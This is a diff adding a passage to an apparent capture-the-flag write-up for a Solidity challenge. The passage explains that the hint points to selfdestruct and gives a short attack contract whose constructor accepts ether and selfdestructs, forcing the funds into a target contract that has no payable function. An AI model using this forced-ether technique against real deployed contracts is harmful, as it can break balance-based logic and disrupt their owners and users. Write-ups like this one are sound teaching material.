@@ -23,3 +23,22 @@ This contract code appears to be an empty contract with ASCII art comment
 "The best way to attack a contract is with another contract." hinted to the `selfdestruct` operation
 
 You can read more about it [here](https://www.alchemy.com/overviews/selfdestruct-solidity)
+
+Since, they hinted us to using another contract, this means we'll have to write a contract that that accepts ether as payment and then self destructs.
+
+Below is our attack contract
+
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.19;
+
+contract drawFunds {
+
+    constructor(address payable _owner) payable {
+        require(msg.value > 0, "Not enough");
+        selfdestruct(_owner);
+    }
+
+}
+```
